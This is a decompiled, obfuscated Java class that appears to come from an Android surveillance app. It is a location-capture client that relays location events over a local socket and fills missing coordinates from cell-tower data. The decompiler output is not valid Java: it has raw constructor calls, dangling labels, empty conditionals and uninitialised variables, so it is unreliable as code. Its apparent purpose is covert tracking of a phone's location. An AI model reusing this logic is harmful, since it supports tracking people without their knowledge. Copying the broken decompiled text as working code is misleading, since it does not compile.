package com.vvt.capture.location;

import android.content.Context;
import android.location.Location;
import android.telephony.TelephonyManager;
import com.fx.socket.SocketCmd;
import com.fx.socket.b;
import com.vvt.base.FxEvent;
import com.vvt.capture.location.ref.command.RemoteLocationEvent;
import com.vvt.capture.location.ref.command.RemoteLocationMetadata;
import com.vvt.capture.location.ref.command.RemoteRegisterListener;
import com.vvt.capture.location.ref.command.RemoteSetTimeIntervalMs;
import com.vvt.capture.location.ref.command.RemoteStartCapture;
import com.vvt.capture.location.ref.command.RemoteStopCapture;
import com.vvt.capture.location.ref.command.RemoteUnregisterListener;
import com.vvt.events.FxLocationEvent;
import com.vvt.location.k;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;

public class e
  implements com.fx.socket.a, a
{
  private static final String a = d.a(e.class.getSimpleName());
  private boolean b;
  private boolean c;
  private boolean d;
  private b e;
  private ConcurrentHashMap f;
  private Context g;
  
  public e(Context paramContext, String paramString)
  {
    boolean bool = com.vvt.ak.a.a;
    this.b = bool;
    bool = com.vvt.ak.a.b;
    this.c = bool;
    bool = com.vvt.ak.a.e;
    this.d = bool;
    ConcurrentHashMap localConcurrentHashMap = new java/util/concurrent/ConcurrentHashMap;
    localConcurrentHashMap.<init>();
    this.f = localConcurrentHashMap;
    this.g = paramContext;
  }
  
  private boolean a(RemoteLocationMetadata paramRemoteLocationMetadata)
  {
    boolean bool1 = true;
    long l1 = 0L;
    double d1 = 0.0D;
    boolean bool2 = this.b;
    if (bool2) {}
    int i = paramRemoteLocationMetadata.getCallingModule();
    FxEvent localFxEvent = paramRemoteLocationMetadata.getEvent();
    Object localObject1 = localFxEvent;
    localObject1 = (FxLocationEvent)localFxEvent;
    double d2 = ((FxLocationEvent)localObject1).getLatitude();
    boolean bool3 = d2 < d1;
    label131:
    Object localObject2;
    if (!bool3)
    {
      d2 = ((FxLocationEvent)localObject1).getLongitude();
      bool3 = d2 < d1;
      if (!bool3)
      {
        bool3 = bool1;
        boolean bool4 = this.b;
        if ((!bool4) || (bool3))
        {
          long l2 = ((FxLocationEvent)localObject1).getCellId();
          l1 = -1;
          d1 = 0.0D / 0.0D;
          bool3 = l2 < l1;
          if (!bool3) {
            break label223;
          }
          a((FxLocationEvent)localObject1);
        }
        localObject1 = CallingModule.forValue(i);
        localObject2 = this.f;
        bool3 = ((ConcurrentHashMap)localObject2).containsKey(localObject1);
        if (!bool3) {
          break label237;
        }
        localObject1 = (com.vvt.base.a)this.f.get(localObject1);
        localObject2 = new java/util/ArrayList;
        ((ArrayList)localObject2).<init>();
        ((List)localObject2).add(localFxEvent);
        ((com.vvt.base.a)localObject1).a((List)localObject2);
      }
    }
    for (;;)
    {
      bool2 = this.b;
      if (bool2) {}
      return bool1;
      bool3 = false;
      localObject2 = null;
      break;
      label223:
      bool2 = this.b;
      if (!bool2) {
        break label131;
      }
      break label131;
      label237:
      bool2 = this.d;
      if (!bool2) {}
    }
  }
  
  private boolean a(FxLocationEvent paramFxLocationEvent)
  {
    boolean bool1 = true;
    double d1 = 0.0D;
    bool2 = this.b;
    if (bool2) {}
    for (;;)
    {
      try
      {
        localObject1 = this.g;
        Object localObject3 = "phone";
        localObject1 = ((Context)localObject1).getSystemService((String)localObject3);
        localObject1 = (TelephonyManager)localObject1;
        localObject3 = k.e((TelephonyManager)localObject1);
        double d2 = ((Location)localObject3).getLatitude();
        bool2 = d2 < d1;
        if (bool2) {
          continue;
        }
        d2 = ((Location)localObject3).getLongitude();
        bool2 = d2 < d1;
        if (bool2) {
          continue;
        }
        bool2 = bool1;
        boolean bool3 = this.b;
        if ((bool3) && (bool2)) {
          continue;
        }
        d2 = ((Location)localObject3).getLongitude();
        paramFxLocationEvent.setLongitude(d2);
        double d3 = ((Location)localObject3).getLatitude();
        paramFxLocationEvent.setLatitude(d3);
        bool2 = bool1;
      }
      catch (Exception localException)
      {
        Object localObject1;
        bool2 = this.d;
        if (!bool2) {
          continue;
        }
        bool2 = false;
        Object localObject2 = null;
        continue;
        bool2 = false;
        localObject2 = null;
        continue;
      }
      bool1 = this.b;
      if (bool1) {}
      return bool2;
      bool2 = false;
      localObject1 = null;
    }
  }
  
  private boolean c()
  {
    boolean bool1 = this.b;
    if (bool1) {}
    bool1 = false;
    try
    {
      b localb = new com/fx/socket/b;
      String str1 = a;
      String str2 = "com.fx.socket.loc.client";
      localb.<init>(str1, str2, this);
      this.e = localb;
      localb = this.e;
      localb.start();
      bool1 = true;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = this.d;
        if (!bool2) {}
      }
    }
    bool2 = this.b;
    if (bool2) {}
    return bool1;
  }
  
  private void d()
  {
    boolean bool = this.b;
    if (bool) {}
    b localb = this.e;
    if (localb != null)
    {
      bool = this.b;
      if (bool) {}
      localb = this.e;
      localb.a();
    }
    bool = this.b;
    if (bool) {}
  }
  
  public Object a(SocketCmd paramSocketCmd)
  {
    boolean bool1 = false;
    Object localObject = null;
    boolean bool2 = paramSocketCmd instanceof RemoteLocationEvent;
    if (bool2)
    {
      bool1 = this.b;
      if (bool1) {}
      paramSocketCmd = (RemoteLocationEvent)paramSocketCmd;
      localObject = (RemoteLocationMetadata)paramSocketCmd.getData();
      bool1 = a((RemoteLocationMetadata)localObject);
      localObject = Boolean.valueOf(bool1);
    }
    return localObject;
  }
  
  public void a(long paramLong)
  {
    boolean bool = this.b;
    if (bool) {}
    RemoteSetTimeIntervalMs localRemoteSetTimeIntervalMs = new com/vvt/capture/location/ref/command/RemoteSetTimeIntervalMs;
    localRemoteSetTimeIntervalMs.<init>(paramLong);
    try
    {
      localRemoteSetTimeIntervalMs.execute();
      bool = this.b;
      if (bool) {}
      return;
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        bool = this.d;
        if (!bool) {}
      }
    }
  }
  
  public void a(CallingModule paramCallingModule)
  {
    boolean bool = this.b;
    if (bool) {}
    bool = this.b;
    if (bool) {}
    RemoteStartCapture localRemoteStartCapture = new com/vvt/capture/location/ref/command/RemoteStartCapture;
    int i = paramCallingModule.getNumber();
    localRemoteStartCapture.<init>(i);
    try
    {
      localRemoteStartCapture.execute();
      bool = this.b;
      if (bool) {}
      return;
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        bool = this.d;
        if (!bool) {}
      }
    }
  }
  
  public void a(CallingModule paramCallingModule, com.vvt.base.a parama)
  {
    bool = this.b;
    if (bool) {}
    bool = this.b;
    if (bool) {}
    Object localObject = new com/vvt/capture/location/ref/command/RemoteRegisterListener;
    int i = paramCallingModule.getNumber();
    ((RemoteRegisterListener)localObject).<init>(i);
    try
    {
      localObject = ((RemoteRegisterListener)localObject).execute();
      localObject = (Boolean)localObject;
      bool = ((Boolean)localObject).booleanValue();
      if (bool)
      {
        localObject = this.f;
        bool = ((ConcurrentHashMap)localObject).containsKey(paramCallingModule);
        if (bool)
        {
          localObject = this.f;
          ((ConcurrentHashMap)localObject).remove(paramCallingModule);
          bool = this.b;
          if (!bool) {}
        }
        localObject = this.f;
        ((ConcurrentHashMap)localObject).put(paramCallingModule, parama);
      }
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        bool = this.d;
        if (!bool) {}
      }
    }
    bool = this.b;
    if (bool) {}
  }
  
  public boolean a()
  {
    boolean bool1 = this.b;
    if (bool1) {}
    bool1 = true;
    b localb = this.e;
    if (localb == null)
    {
      bool2 = this.c;
      if (bool2) {}
      bool2 = c();
      if (!bool2)
      {
        bool1 = this.d;
        if (bool1) {}
        bool1 = false;
      }
    }
    boolean bool2 = this.b;
    if (bool2) {}
    bool2 = this.b;
    if (bool2) {}
    return bool1;
  }
  
  public void b()
  {
    boolean bool = this.b;
    if (bool) {}
    d();
    bool = this.b;
    if (bool) {}
  }
  
  public void b(CallingModule paramCallingModule)
  {
    boolean bool = this.b;
    if (bool) {}
    bool = this.b;
    if (bool) {}
    RemoteStopCapture localRemoteStopCapture = new com/vvt/capture/location/ref/command/RemoteStopCapture;
    int i = paramCallingModule.getNumber();
    localRemoteStopCapture.<init>(i);
    try
    {
      localRemoteStopCapture.execute();
      bool = this.b;
      if (bool) {}
      return;
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        bool = this.d;
        if (!bool) {}
      }
    }
  }
  
  public void b(CallingModule paramCallingModule, com.vvt.base.a parama)
  {
    bool = this.b;
    if (bool) {}
    bool = this.b;
    if (bool) {}
    Object localObject = new com/vvt/capture/location/ref/command/RemoteUnregisterListener;
    int i = paramCallingModule.getNumber();
    ((RemoteUnregisterListener)localObject).<init>(i);
    try
    {
      localObject = ((RemoteUnregisterListener)localObject).execute();
      localObject = (Boolean)localObject;
      bool = ((Boolean)localObject).booleanValue();
      if (bool)
      {
        localObject = this.f;
        bool = ((ConcurrentHashMap)localObject).containsKey(paramCallingModule);
        if (bool)
        {
          localObject = this.f;
          ((ConcurrentHashMap)localObject).remove(paramCallingModule);
          bool = this.b;
          if (!bool) {}
        }
      }
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        bool = this.d;
        if (!bool) {}
      }
    }
    bool = this.b;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/location/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */